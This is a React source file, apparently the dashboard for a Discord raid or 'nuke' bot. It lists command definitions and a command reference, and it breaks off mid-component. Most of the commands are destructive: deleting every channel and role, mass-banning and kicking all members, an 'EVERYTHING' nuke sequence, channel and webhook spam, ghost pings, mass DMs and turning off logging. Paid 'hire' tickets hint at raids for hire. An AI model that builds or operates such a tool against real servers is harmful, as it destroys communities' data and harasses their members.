"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";

// ─── Types ─────────────────────────────────────────────────────────────────

type BotEvent = {
  id: string; timestamp: string; level: "info" | "warn" | "error";
  type: string; message: string; command?: string; user?: string; guild?: string; channel?: string;
};

type BotMetrics = {
  connected: boolean; uptimeSeconds: number; latencyMs: number;
  guilds: number; members: number; channels: number; commands: number; heartbeatAt: string;
};

type ActionHistory = {
  id: string; action: string; params: Record<string, unknown>;
  status: "pending" | "dispatched" | "done" | "failed";
  result?: string; ok?: boolean; queuedAt: string; completedAt?: string;
};

type CmdState = {
  status: "idle" | "pending" | "done" | "failed" | "timeout";
  result: string; ts: string;
};

type CmdField = {
  name: string; label: string; placeholder?: string;
  type?: "text" | "number" | "textarea" | "select";
  options?: { value: string; label: string }[];
  required?: boolean;
};

type CmdDef = {
  id: string; label: string; description: string;
  danger?: boolean; fields: CmdField[];
  direct?: boolean; // true = calls /api/discord-exec (instant), false = queues to bot
};

type CmdCategory = { id: string; label: string; emoji: string; cmds: CmdDef[]; };

// ─── Command Center Definitions ─────────────────────────────────────────────

const CTRL_CATEGORIES: CmdCategory[] = [
  {
    id: "bot",
    label: "Bot Identity",
    emoji: "🤖",
    cmds: [
      { id: "ping_bot", label: "Ping Bot", description: "Check if the Discord gateway is reachable.", fields: [], direct: true },
      { id: "bot_info", label: "Bot Info", description: "Fetch live bot user info from Discord.", fields: [], direct: true },
      {
        id: "set_status", label: "Set Status", description: "Change the bot's online presence status.",
        fields: [{ name: "status", label: "Status", type: "select", required: true, options: [{ value: "online", label: "🟢 Online" }, { value: "idle", label: "🟡 Idle" }, { value: "dnd", label: "🔴 Do Not Disturb" }, { value: "invisible", label: "⚫ Invisible" }] }],
      },
      {
        id: "set_activity", label: "Set Activity", description: "Set what the bot is playing/watching/listening to.",
        fields: [
          { name: "type", label: "Type", type: "select", required: true, options: [{ value: "playing", label: "Playing" }, { value: "watching", label: "Watching" }, { value: "listening", label: "Listening to" }, { value: "competing", label: "Competing in" }] },
          { name: "text", label: "Activity Text", placeholder: "the void", required: true },
        ],
      },
      { id: "set_name", label: "Set Username", description: "Rename the bot account globally.", fields: [{ name: "name", label: "New Username", placeholder: "Alpha Omega", required: true }] },
      { id: "set_avatar", label: "Set Avatar", description: "Change the bot's profile picture via image URL.", fields: [{ name: "url", label: "Image URL", placeholder: "https://…", required: true }] },
      { id: "stop_ops", label: "Stop Operations", description: "Halt all bot destructive operations immediately.", danger: true, fields: [] },
      { id: "resume_ops", label: "Resume Operations", description: "Re-enable bot operations after a stop.", fields: [] },
    ],
  },
  {
    id: "whitelist",
    label: "Whitelist",
    emoji: "🔐",
    cmds: [
      { id: "wl_list", label: "List Whitelist", description: "Return all whitelisted user IDs.", fields: [] },
      { id: "wl_add", label: "Add to Whitelist", description: "Grant a user full bot access.", fields: [{ name: "user_id", label: "User ID", placeholder: "123456789012345678", required: true }] },
      { id: "wl_remove", label: "Remove from Whitelist", description: "Revoke a user's bot access.", danger: true, fields: [{ name: "user_id", label: "User ID", placeholder: "123456789012345678", required: true }] },
    ],
  },
  {
    id: "guilds",
    label: "Guilds",
    emoji: "🏰",
    cmds: [
      { id: "get_guilds", label: "List Guilds", description: "Return all servers the bot is currently in.", fields: [], direct: true },
      { id: "get_guild_info", label: "Guild Info", description: "Detailed info for a specific guild.", fields: [{ name: "guild_id", label: "Guild ID", placeholder: "123456789012345678", required: true }], direct: true },
      { id: "guild_audit", label: "Audit Log", description: "Fetch the latest audit log entries for a guild.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "limit", label: "Limit (max 25)", type: "number", placeholder: "10" }], direct: true },
      { id: "list_invites", label: "List Invites", description: "Show all active invite links for a guild.", fields: [{ name: "guild_id", label: "Guild ID", required: true }], direct: true },
      { id: "del_all_invites", label: "Delete All Invites", description: "Revoke every invite link in a guild.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }], direct: true },
      { id: "leave_guild", label: "Leave Guild", description: "Force the bot to leave a server.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }], direct: true },
    ],
  },
  {
    id: "channels",
    label: "Channels",
    emoji: "💬",
    cmds: [
      { id: "get_channels", label: "List Channels", description: "List all channels in a guild (sorted by position).", fields: [{ name: "guild_id", label: "Guild ID", required: true }], direct: true },
      { id: "get_webhooks", label: "List Webhooks", description: "Show all webhooks in a guild.", fields: [{ name: "guild_id", label: "Guild ID", required: true }], direct: true },
      { id: "create_channel", label: "Create Channel", description: "Create a new channel in a guild.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "name", label: "Channel Name", placeholder: "shadow-ops", required: true }, { name: "type", label: "Type (0=text, 2=voice, 4=cat)", type: "number", placeholder: "0" }, { name: "topic", label: "Topic (optional)" }], direct: true },
      { id: "delete_channel", label: "Delete Channel", description: "Permanently delete a channel.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }], direct: true },
      { id: "rename_channel", label: "Rename Channel", description: "Rename an existing channel.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }, { name: "name", label: "New Name", placeholder: "shadow-realm", required: true }], direct: true },
      { id: "lock_channel", label: "Lock Channel", description: "Deny @everyone from sending messages.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }], direct: true },
      { id: "unlock_channel", label: "Unlock Channel", description: "Restore @everyone send permissions.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }], direct: true },
      { id: "hide_channel", label: "Hide Channel", description: "Make a channel invisible to @everyone.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }], direct: true },
      { id: "show_channel", label: "Show Channel", description: "Restore @everyone visibility to a channel.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }], direct: true },
      { id: "slow_channel", label: "Slowmode", description: "Set slowmode delay on a channel (0 = off).", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }, { name: "seconds", label: "Seconds (0–21600)", type: "number", placeholder: "5", required: true }], direct: true },
      { id: "topic_channel", label: "Set Topic", description: "Update a channel's topic/description.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }, { name: "topic", label: "Topic text", required: true }], direct: true },
      { id: "purge_channel", label: "Purge Messages", description: "Bulk-delete up to 100 recent messages.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }, { name: "count", label: "Count (max 100)", type: "number", placeholder: "50", required: true }], direct: true },
      { id: "pin_message", label: "Pin Message", description: "Pin a specific message in a channel.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }, { name: "message_id", label: "Message ID", required: true }], direct: true },
      { id: "nuke_channel", label: "Nuke Channel", description: "Delete and recreate a channel (clears all history).", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }, { name: "name", label: "New Name (optional)", placeholder: "same as before" }] },
      { id: "lock_all", label: "Lock All Channels", description: "Lock every text channel in a guild.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
      { id: "unlock_all", label: "Unlock All Channels", description: "Unlock every text channel in a guild.", fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
      { id: "hide_all", label: "Hide All Channels", description: "Hide every channel from @everyone.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
      { id: "show_all", label: "Show All Channels", description: "Unhide every channel for @everyone.", fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
    ],
  },
  {
    id: "roles",
    label: "Roles",
    emoji: "🎭",
    cmds: [
      { id: "get_roles", label: "List Roles", description: "List all roles in a guild (sorted by position).", fields: [{ name: "guild_id", label: "Guild ID", required: true }], direct: true },
      { id: "create_role", label: "Create Role", description: "Create a new role in a guild.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "name", label: "Role Name", placeholder: "Shadow Agent", required: true }, { name: "color", label: "Color hex (optional)", placeholder: "7c3aed" }], direct: true },
      { id: "delete_role", label: "Delete Role", description: "Permanently delete a role from a guild.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "role_id", label: "Role ID", required: true }], direct: true },
      { id: "rename_role", label: "Rename Role", description: "Rename an existing role.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "role_id", label: "Role ID", required: true }, { name: "name", label: "New Name", required: true }], direct: true },
      { id: "color_role", label: "Color Role", description: "Change the color of a role.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "role_id", label: "Role ID", required: true }, { name: "color", label: "Color hex", placeholder: "dc2626", required: true }], direct: true },
      { id: "add_role_user", label: "Add Role to User", description: "Give a specific role to a specific member.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "user_id", label: "User ID", required: true }, { name: "role_id", label: "Role ID", required: true }], direct: true },
      { id: "remove_role_user", label: "Remove Role from User", description: "Strip a specific role from a specific member.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "user_id", label: "User ID", required: true }, { name: "role_id", label: "Role ID", required: true }], direct: true },
      { id: "mass_add_role", label: "Mass Add Role", description: "Give a role to every member in the guild.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "role_id", label: "Role ID", required: true }] },
      { id: "mass_remove_role", label: "Mass Remove Role", description: "Strip a role from every member.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "role_id", label: "Role ID", required: true }] },
      { id: "del_all_roles", label: "Delete All Roles", description: "Delete every non-default role in the guild.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
    ],
  },
  {
    id: "members",
    label: "Members",
    emoji: "👥",
    cmds: [
      { id: "get_members", label: "List Members", description: "List up to 100 members from a guild.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "limit", label: "Limit (max 100)", type: "number", placeholder: "50" }], direct: true },
      { id: "get_user_info", label: "User Info", description: "Look up a user's Discord profile.", fields: [{ name: "user_id", label: "User ID", required: true }], direct: true },
      { id: "list_bans", label: "List Bans", description: "Show all bans in a guild (up to 100).", fields: [{ name: "guild_id", label: "Guild ID", required: true }], direct: true },
      { id: "ban_user", label: "Ban User", description: "Ban a member from a guild.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "user_id", label: "User ID", required: true }, { name: "reason", label: "Reason (optional)", placeholder: "shadow justice" }], direct: true },
      { id: "kick_user", label: "Kick User", description: "Kick a member from a guild.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "user_id", label: "User ID", required: true }, { name: "reason", label: "Reason (optional)" }], direct: true },
      { id: "unban_user", label: "Unban User", description: "Remove a ban by user ID.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "user_id", label: "User ID", required: true }], direct: true },
      { id: "timeout_user", label: "Timeout User", description: "Mute a member for a set number of minutes.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "user_id", label: "User ID", required: true }, { name: "minutes", label: "Minutes", type: "number", placeholder: "10", required: true }], direct: true },
      { id: "untimeout_user", label: "Remove Timeout", description: "Clear an active timeout from a member.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "user_id", label: "User ID", required: true }], direct: true },
      { id: "nick_user", label: "Nickname User", description: "Set a member's server nickname.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "user_id", label: "User ID", required: true }, { name: "nick", label: "Nickname", placeholder: "Shadow Agent", required: true }], direct: true },
      { id: "mass_ban", label: "Mass Ban", description: "Ban every non-bot member in the guild.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
      { id: "mass_kick", label: "Mass Kick", description: "Kick every non-bot member in the guild.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
      { id: "mass_timeout", label: "Mass Timeout", description: "Timeout every member for a set duration.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "minutes", label: "Minutes", type: "number", placeholder: "60", required: true }] },
      { id: "reset_nicks", label: "Reset All Nicknames", description: "Clear every member's server nickname.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
      { id: "strip_all", label: "Strip All Roles", description: "Remove all assignable roles from every member.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
    ],
  },
  {
    id: "messaging",
    label: "Messaging",
    emoji: "📨",
    cmds: [
      { id: "send_message", label: "Send Message", description: "Send a plain text message to a channel.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }, { name: "message", label: "Message", type: "textarea", placeholder: "From the shadows…", required: true }], direct: true },
      { id: "send_embed", label: "Send Embed", description: "Send a styled embed card to a channel.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }, { name: "title", label: "Embed Title", required: true }, { name: "description", label: "Description", type: "textarea" }, { name: "color", label: "Color hex", placeholder: "7c3aed" }, { name: "footer", label: "Footer (optional)" }, { name: "image", label: "Image URL (optional)" }], direct: true },
      { id: "send_dm", label: "Send DM", description: "Open a DM channel and send a message to any user.", fields: [{ name: "user_id", label: "User ID", required: true }, { name: "message", label: "Message", type: "textarea", placeholder: "I am atomic.", required: true }], direct: true },
      { id: "pin_message", label: "Pin Message", description: "Pin a specific message in a channel.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }, { name: "message_id", label: "Message ID", required: true }], direct: true },
      { id: "global_announce", label: "Global Announce", description: "Broadcast a message to all guilds' system channels.", danger: true, fields: [{ name: "message", label: "Announcement", type: "textarea", required: true }] },
      { id: "spam_channel", label: "Spam Channel", description: "Send repeated messages to a channel.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }, { name: "count", label: "Count", type: "number", placeholder: "10", required: true }, { name: "message", label: "Message", placeholder: "shadow…", required: true }] },
      { id: "ghost_ping_all", label: "Ghost Ping @everyone", description: "Send then immediately delete an @everyone mention.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }, { name: "count", label: "Count", type: "number", placeholder: "1", required: true }] },
      { id: "purge_all", label: "Purge All Messages", description: "Wipe ALL messages from a channel (up to 10k).", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }] },
      { id: "dm_all", label: "DM All Members", description: "Send a DM to every member in the guild.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "message", label: "Message", type: "textarea", required: true }] },
      { id: "dm_role", label: "DM Role Members", description: "Send a DM to every member who has a specific role.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "role_id", label: "Role ID", required: true }, { name: "message", label: "Message", type: "textarea", required: true }] },
    ],
  },
  {
    id: "server",
    label: "Server",
    emoji: "⚙️",
    cmds: [
      { id: "rename_server", label: "Rename Server", description: "Change the name of a guild.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "name", label: "New Name", placeholder: "Shadow Garden", required: true }], direct: true },
      { id: "set_icon", label: "Set Server Icon", description: "Set a new server icon from an image URL.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "url", label: "Image URL", required: true }], direct: true },
      { id: "set_banner", label: "Set Server Banner", description: "Set a new server banner from an image URL.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "url", label: "Image URL", required: true }], direct: true },
      { id: "set_verification", label: "Verification Level", description: "Change the server verification level (0–4).", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "level", label: "Level", type: "select", required: true, options: [{ value: "0", label: "0 — None" }, { value: "1", label: "1 — Low" }, { value: "2", label: "2 — Medium" }, { value: "3", label: "3 — High" }, { value: "4", label: "4 — Very High" }] }], direct: true },
      { id: "set_content_filter", label: "Content Filter", description: "Change the explicit content filter level.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "level", label: "Level", type: "select", required: true, options: [{ value: "0", label: "0 — Disabled" }, { value: "1", label: "1 — Without Roles" }, { value: "2", label: "2 — All Members" }] }], direct: true },
      { id: "set_notif", label: "Notifications", description: "Set the default notification level.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "level", label: "Level", type: "select", required: true, options: [{ value: "0", label: "0 — All Messages" }, { value: "1", label: "1 — Only Mentions" }] }], direct: true },
      { id: "del_webhooks", label: "Delete All Webhooks", description: "Remove every webhook from a guild.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }], direct: true },
      { id: "del_emojis", label: "Delete All Emojis", description: "Remove every custom emoji from a guild.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }], direct: true },
      { id: "del_stickers", label: "Delete All Stickers", description: "Remove every custom sticker from a guild.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
      { id: "del_threads", label: "Delete All Threads", description: "Delete every active thread in a guild.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
    ],
  },
  {
    id: "config",
    label: "Config",
    emoji: "🔧",
    cmds: [
      { id: "get_config", label: "Get Bot Config", description: "Return bot configuration: prefix, stop state, log channel.", fields: [] },
      { id: "get_warnings", label: "Get Warnings", description: "Return warning records for a user (or all).", fields: [{ name: "user_id", label: "User ID (optional)", placeholder: "leave blank for all" }] },
      { id: "get_backups", label: "List Backups", description: "Return all saved server backup snapshots.", fields: [] },
      { id: "set_log_channel", label: "Set Log Channel", description: "Route bot action logs to a specific channel.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }] },
      { id: "log_off", label: "Disable Logging", description: "Turn off all in-Discord action logging.", fields: [] },
    ],
  },
  {
    id: "hire",
    label: "Hire Tickets",
    emoji: "🎫",
    cmds: [
      { id: "get_hire_tickets", label: "List Tickets", description: "Return all open hire tickets.", fields: [] },
      { id: "accept_hire", label: "Accept Ticket", description: "Mark a hire ticket as accepted.", fields: [{ name: "ticket_id", label: "Ticket ID", required: true }] },
      { id: "deny_hire", label: "Deny Ticket", description: "Deny a hire ticket with optional reason.", fields: [{ name: "ticket_id", label: "Ticket ID", required: true }, { name: "reason", label: "Reason (optional)", placeholder: "Not available" }] },
      { id: "close_hire", label: "Close Ticket", description: "Close and archive a hire ticket.", fields: [{ name: "ticket_id", label: "Ticket ID", required: true }] },
    ],
  },
  {
    id: "nuke",
    label: "Nuke Ops",
    emoji: "💀",
    cmds: [
      { id: "nuke_channel", label: "Nuke Channel", description: "Delete and recreate a channel (wipes all history).", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Channel ID", required: true }, { name: "name", label: "New Name (optional)", placeholder: "same name" }] },
      { id: "nuke_all", label: "Nuke All Channels", description: "Delete and recreate EVERY channel in the guild.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
      { id: "del_all_channels", label: "Delete All Channels", description: "Permanently delete every channel in the guild.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
      { id: "del_all_roles", label: "Delete All Roles", description: "Delete every non-default role from the guild.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
      { id: "mass_webhook", label: "Mass Create Webhooks", description: "Create N webhooks across every channel.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "count", label: "Webhooks per Channel", type: "number", placeholder: "5", required: true }, { name: "name", label: "Webhook Name", placeholder: "shadow", required: true }] },
      { id: "everything", label: "⚠ EVERYTHING", description: "Run full nuke sequence: delete all channels, roles, ban all members.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
    ],
  },
  {
    id: "voice",
    label: "Voice Ops",
    emoji: "🔊",
    cmds: [
      { id: "deafen_all", label: "Deafen All VC", description: "Server-deafen all members currently in voice.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
      { id: "mute_all_vc", label: "Mute All VC", description: "Server-mute all members currently in voice.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
      { id: "undeafen_all", label: "Undeafen All VC", description: "Remove server-deafen from all voice members.", fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
      { id: "unmute_all_vc", label: "Unmute All VC", description: "Remove server-mute from all voice members.", fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
      { id: "disconnect_all_vc", label: "Disconnect All VC", description: "Disconnect every member from voice channels.", danger: true, fields: [{ name: "guild_id", label: "Guild ID", required: true }] },
      { id: "move_all_vc", label: "Move All VC", description: "Move all voice channel members to a target channel.", fields: [{ name: "guild_id", label: "Guild ID", required: true }, { name: "channel_id", label: "Target Channel ID", required: true }] },
    ],
  },
];

// ─── Command Reference ────────────────────────────────────────────────────────

const groups: Record<string, string[]> = {
  Channels: ["archivech <#ch>","channelinfo","createinvite [#ch]","hideall","lockall","mcat <name> <count>","mc <name> <count>","mcv <name> <count>","movech <#ch> <#cat>","showall","slowall <seconds>","topicall <topic>","unlockall"],
  Roles: ["cloner <role> <name>","colorallr <hex>","hoistallr","listroles","mentionallr","mr <name> <count>","massremoverole <role>","massrole <role>","roleinfo <role>","unhoistallr","unmentionallr"],
  Members: ["joindate <days>","jointime <user>","listbans","massdeafen","massmute","membercount","nickall <nick>","resetnicks","timeoutall <minutes>","undeafenall","unmuteall","untimeoutall","userinfo <user>"],
  "Mass DM": ["dmowner <msg>","dmsall <msg>","dmrepeat <user> <count> <msg>","massdmbots <msg>","massdmids <id,id,...> <msg>","massdmnew <days> <msg>","massdmoffline <msg>","massdmonline <msg>","massdmrole <role> <msg>"],
  Messaging: ["countdown <n> <msg>","forwardall <#src> <#dest>","pin <msg_id>","purge <count>","purgebots <count>","purgeuser <user>","react <msg> <emoji>","say <#ch> <msg>","wipechat"],
  Server: ["audit <count>","banner <url>","delthreads","delemojis","delstickers","description <text>","delwebhooks","icon <url>","listinvites","renameserver <name>","serverinfo","setafk <#vc>","setfilter <0-2>","setnotif <0-1>","setverification <0-4>","vanity"],
  Logging: ["log [#channel]","logclear","logfile","logoff","logtail [lines]"],
  Bot: ["activity <type> <text>","botavatar <url>","botname <name>","botstatus <text>","cmdcount","guilds","ping","resume","stop","uptime"],
  Whitelist: ["wladd <user_id>","wlremove <user_id>","wllist"],
  ModMail: ["hireclose <id>","hiredeny <id> [reason]","hireinfo <id>","hirelist","hireaccept <id>","hirecancel <id>","hirenote <id> <note>","hiresetup [#ch]"],
  Hire: ["hire","hireprice","hirestatus <id>","setprice <tier> <amt>"],
  Utility: ["avatar [user]","botinfo","serverinfo","snipe","uptime","ping","whois <user>"],
  Destructive: ["ban <user>","bulkban <ids>","dar","dac","datc","davc","dacat","everything","hackban <id>","kick <user>","mban <count>","mkick <count>","massunban","nuke [name] [msg]","nukeall [name]","spam <count> <msg>","spamall <count> <msg>","stripall","depermsall","webhook <name> <count>","whnuke <name> <count>","wipechat"],
};

const descMap: Record<string, string> = {
  archivech:"Archive a channel to a category.",channelinfo:"Show info about the current channel.",createinvite:"Create an invite link.",hideall:"Hide all channels from @everyone.",lockall:"Lock all channels.",mcat:"Mass-create categories.",mc:"Mass-create text channels.",mcv:"Mass-create voice channels.",movech:"Move a channel to a category.",showall:"Show all channels to @everyone.",slowall:"Set slowmode on all channels.",topicall:"Set topic on all channels.",unlockall:"Unlock all channels.",cloner:"Clone a role with a new name.",colorallr:"Set color for all roles.",hoistallr:"Hoist all roles.",listroles:"List all server roles.",mentionallr:"Make all roles mentionable.",mr:"Mass-create roles.",massremoverole:"Remove a role from all members.",massrole:"Add a role to all members.",roleinfo:"Show role information.",unhoistallr:"Unhoist all roles.",unmentionallr:"Remove mentionable from all roles.",joindate:"List members who joined within N days.",jointime:"Show when a user joined.",listbans:"List all server bans.",massdeafen:"Deafen all members in VC.",massmute:"Mute all members in VC.",membercount:"Show member count.",nickall:"Set nickname for all members.",resetnicks:"Reset all nicknames.",timeoutall:"Timeout all members.",undeafenall:"Undeafen all members in VC.",unmuteall:"Unmute all members in VC.",untimeoutall:"Remove timeout from all members.",userinfo:"Show detailed user information.",dmowner:"DM the server owner.",dmsall:"DM all members.",dmrepeat:"DM a user repeatedly.",massdmbots:"DM all bots.",massdmids:"DM specific user IDs.",massdmnew:"DM recently joined members.",massdmoffline:"DM all offline members.",massdmonline:"DM all online members.",massdmrole:"DM all members with a role.",countdown:"Send countdown messages.",forwardall:"Forward all messages between channels.",pin:"Pin a message by ID.",purge:"Purge N messages.",purgebots:"Purge bot messages.",purgeuser:"Purge messages by user.",react:"Add a reaction to a message.",say:"Say something in a channel.",wipechat:"Wipe entire channel chat.",audit:"Show recent audit log.",banner:"Set server banner.",delthreads:"Delete all threads.",delemojis:"Delete all emojis.",delstickers:"Delete all stickers.",description:"Set server description.",delwebhooks:"Delete all webhooks.",icon:"Set server icon.",listinvites:"List server invites.",renameserver:"Rename the server.",serverinfo:"Show server information.",setafk:"Set AFK voice channel.",setfilter:"Set content filter level.",setnotif:"Set notification level.",setverification:"Set verification level.",vanity:"Get server vanity URL.",log:"Enable action logging to a channel.",logclear:"Clear the log file.",logfile:"Enable file logging.",logoff:"Disable logging.",logtail:"View tail of log file.",activity:"Set bot activity.",botavatar:"Set bot avatar.",botname:"Rename the bot.",botstatus:"Set bot status text.",cmdcount:"Count registered commands.",guilds:"List connected guilds.",ping:"Check bot latency.",resume:"Resume bot operations.",stop:"Stop bot operations.",uptime:"Show bot uptime.",wladd:"Add user to whitelist.",wlremove:"Remove user from whitelist.",wllist:"List whitelisted users.",hireclose:"Close a hire ticket.",hiredeny:"Deny a hire ticket.",hireinfo:"Show hire ticket info.",hirelist:"List all hire tickets.",hireaccept:"Accept a hire ticket.",hirecancel:"Cancel a hire ticket.",hirenote:"Add note to hire ticket.",hiresetup:"Set up hire channel.",hire:"Start a hire request.",hireprice:"Check hire pricing.",hirestatus:"Check hire ticket status.",setprice:"Set a hire price tier.",avatar:"Show a user's avatar.",botinfo:"Show bot information.",snipe:"Show last deleted message.",whois:"Look up a user.",ban:"Ban a user.",bulkban:"Ban multiple users by ID.",dar:"Delete all roles.",dac:"Delete all channels.",datc:"Delete all text channels.",davc:"Delete all voice channels.",dacat:"Delete all categories.",everything:"Run full nuke sequence.",hackban:"Ban by user ID.",kick:"Kick a user.",mban:"Mass ban members.",mkick:"Mass kick members.",massunban:"Unban all members.",nuke:"Nuke a channel.",nukeall:"Nuke all channels.",spam:"Spam a channel.",spamall:"Spam all channels.",stripall:"Strip all roles from members.",depermsall:"Remove all channel permissions.",webhook:"Mass create webhooks.",whnuke:"Spam via webhooks.",
};

type Command = { name: string; category: string; description: string; permission: string; example: string; };
const commands: Command[] = Object.entries(groups).flatMap(([cat, list]) =>
  list.map((raw) => {
    const base = raw.split(" ")[0];
    return {
      name: `!${raw}`, category: cat,
      description: descMap[base] ?? `Run ${base}.`,
      permission: ["Hire", "Utility"].includes(cat) ? "Public" : "Whitelist",
      example: `!${raw.replace(/[<>[\]]/g, "").trim()}`,
    };
  }),
);

// ─── CommandCard component ────────────────────────────────────────────────────

const TIMEOUT_MS = 35_000;

function CommandCard({ cmd, onSubmit, state }: {
  cmd: CmdDef;
  onSubmit: (action: string, params: Record<string, string | number>, direct: boolean) => Promise<void>;
  state: CmdState | undefined;
}) {
  const [values, setValues] = useState<Record<string, string>>({});
  const [loading, setLoading] = useState(false);

  const set = (name: string, value: string) => setValues((p) => ({ ...p, [name]: value }));

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    for (const f of cmd.fields) { if (f.required && !values[f.name]?.trim()) return; }
    setLoading(true);
    const params: Record<string, string | number> = {};
    for (const f of cmd.fields) {
      const v = values[f.name] ?? "";
      params[f.name] = f.type === "number" ? Number(v) : v;
    }
    await onSubmit(cmd.id, params, cmd.direct === true);
    setLoading(false);
  };

  const now = Date.now();
  const isTimedOut = state?.status === "pending" && state.ts && (now - new Date(state.ts).getTime()) > TIMEOUT_MS;
  const isPending = (state?.status === "pending" || loading) && !isTimedOut;
  const isDone = state?.status === "done";
  const isFailed = state?.status === "failed";
  const isTimeout = state?.status === "timeout" || isTimedOut;

  const cardClass = [
    "ctrl-card",
    cmd.danger ? "ctrl-danger" : "",
    cmd.direct ? "ctrl-direct" : "",
    isDone ? "ctrl-done" : "",
    isFailed || isTimeout ? "ctrl-failed" : "",
  ].filter(Boolean).join(" ");

  return (
    <div className={cardClass}>
      <div className="ctrl-card-head">
        <strong>{cmd.label}</strong>
        {cmd.danger && <span className="ctrl-danger-pill">DANGER</span>}
      </div>
      <p className="ctrl-card-desc">{cmd.description}</p>
      <form onSubmit={handleSubmit} className="ctrl-form">
        {cmd.fields.map((f) => (
          <div key={f.name} className="ctrl-field">
            <label>{f.label}</label>
            {f.type === "select" ? (
              <select value={values[f.name] ?? ""} onChange={(e) => set(f.name, e.target.value)}>
                <option value="">Select…</option>
                {f.options?.map((o) => <option key={o.value} value={o.value}>{o.label}</option>)}
              </select>
            ) : f.type === "textarea" ? (
              <textarea value={values[f.name] ?? ""} onChange={(e) => set(f.name, e.target.value)} placeholder={f.placeholder} rows={2} />
            ) : (
              <input type={f.type === "number" ? "number" : "text"} value={values[f.name] ?? ""} onChange={(e) => set(f.name, e.target.value)} placeholder={f.placeholder} />
            )}
          </div>
        ))}
        <button type="submit" disabled={isPending} className={`ctrl-submit${cmd.danger ? " ctrl-submit-danger" : ""}`}>
